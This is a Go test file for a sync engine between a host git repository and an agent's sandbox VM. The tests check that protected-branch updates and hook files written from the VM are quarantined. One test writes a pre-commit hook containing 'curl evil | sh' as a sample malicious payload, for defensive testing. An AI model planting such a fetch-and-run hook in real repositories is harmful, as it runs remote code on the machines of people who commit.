package syncengine

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/samaritanark/agent-sandboxes/go/internal/host/syncgate"
)

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL="+os.DevNull, "GIT_CONFIG_NOSYSTEM=1",
		"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.org", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.org")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v in %s: %v\n%s", args, dir, err, out)
	}
	return strings.TrimSpace(string(out))
}

func TestSyncGit(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	host, vmdir, state := t.TempDir(), t.TempDir(), t.TempDir()
	git(t, host, "init", "-q", "--template=", "-b", "main")
	write(t, host, "a.txt", "a\n")
	git(t, host, "add", "a.txt")
	git(t, host, "commit", "-q", "-m", "one")
	git(t, host, "branch", "feature")
	store := &syncgate.Store{Dir: filepath.Join(state, "quarantine")}
	// a state directory that does not exist yet, as on a repository's first sync
	e := &Engine{Repo: host, StateFile: filepath.Join(state, "new", "sync.json"), Store: store, VM: pipeVM(t, vmdir)}

	// the operator's own index settings must survive the sync
	git(t, host, "update-index", "--skip-worktree", "a.txt")
	// first sync: the VM copy is a working clone, and the host's index is left alone
	rep0, err := e.Sync()
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range rep0.ToHost {
		if p == ".git/index" {
			t.Error("the first sync rewrote the host's index")
		}
	}
	if git(t, vmdir, "rev-parse", "HEAD") != git(t, host, "rev-parse", "HEAD") || git(t, vmdir, "status", "--porcelain") != "" {
		t.Fatal("the VM copy does not match the host")
	}
	mainBefore := git(t, host, "rev-parse", "main")

	// the agent: a commit on main (protected), a commit on feature, and a staged file
	write(t, vmdir, "m.txt", "on main\n")
	git(t, vmdir, "add", "m.txt")
	git(t, vmdir, "commit", "-q", "-m", "agent on main")
	agentMain := git(t, vmdir, "rev-parse", "HEAD")
	git(t, vmdir, "checkout", "-q", "feature")
	write(t, vmdir, "f.txt", "feature work\n")
	git(t, vmdir, "add", "f.txt")
	git(t, vmdir, "commit", "-q", "-m", "agent on feature")
	feature := git(t, vmdir, "rev-parse", "HEAD")
	write(t, vmdir, "staged.txt", "staged\n")
	git(t, vmdir, "add", "staged.txt")

	rep, err := e.Sync()
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("%+v", rep)
	if git(t, host, "rev-parse", "feature") != feature {
		t.Error("feature was not fast-forwarded")
	}
	if git(t, host, "rev-parse", "main") != mainBefore {
		t.Error("the protected branch moved")
	}
	if git(t, host, "symbolic-ref", "HEAD") != "refs/heads/feature" {
		t.Error("HEAD did not follow the VM's branch switch")
	}
	if got := git(t, host, "diff", "--cached", "--name-only"); got != "staged.txt" {
		t.Errorf("host staging: %q", got)
	}
	git(t, host, "cat-file", "-e", agentMain) // the objects arrived, even for the withheld branch
	git(t, host, "fsck", "--strict", "--no-dangling")
	if !strings.Contains(git(t, host, "ls-files", "-v", "a.txt"), "S a.txt") {
		t.Error("the operator's skip-worktree flag was lost")
	}
	held, _ := store.List()
	var refHeld bool
	for _, h := range held {
		if h.Path == ".git/refs/heads/main" && strings.Contains(h.Reason, "protected") {
			refHeld = true
		}
	}
	if !refHeld {
		t.Errorf("the main update was not quarantined: %+v", held)
	}
	if len(rep.Ledger) == 0 {
		t.Error("no ledger entries for the applied ref and HEAD updates")
	}

	// the operator commits on the host: it reaches the VM
	git(t, host, "commit", "-q", "-m", "operator commits the staged file")
	opCommit := git(t, host, "rev-parse", "HEAD")
	if _, err := e.Sync(); err != nil {
		t.Fatal(err)
	}
	if git(t, vmdir, "rev-parse", "feature") != opCommit {
		t.Error("the operator's commit did not reach the VM")
	}
	if got := git(t, vmdir, "status", "--porcelain"); got != "" {
		t.Errorf("the VM copy is not clean after the operator's commit: %q", got)
	}
}

func TestHooksPathQuarantined(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	t.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	host, vmdir, state := t.TempDir(), t.TempDir(), t.TempDir()
	git(t, host, "init", "-q", "--template=", "-b", "main")
	git(t, host, "config", "core.hooksPath", "tools/git-hooks")
	write(t, host, "tools/readme.txt", "x\n")
	store := &syncgate.Store{Dir: filepath.Join(state, "quarantine")}
	e := &Engine{Repo: host, StateFile: filepath.Join(state, "sync.json"), Store: store, VM: pipeVM(t, vmdir)}
	if _, err := e.Sync(); err != nil {
		t.Fatal(err)
	}
	write(t, vmdir, "tools/git-hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n")
	write(t, vmdir, "tools/other.txt", "fine\n")
	rep, err := e.Sync()
	if err != nil {
		t.Fatal(err)
	}
	if exists(host, "tools/git-hooks/pre-commit") || !exists(host, "tools/other.txt") {
		t.Errorf("hook applied or ordinary file not: %+v", rep)
	}
	if strings.Join(rep.Quarantined, " ") != "tools/git-hooks/pre-commit" {
		t.Errorf("quarantined %v", rep.Quarantined)
	}
}
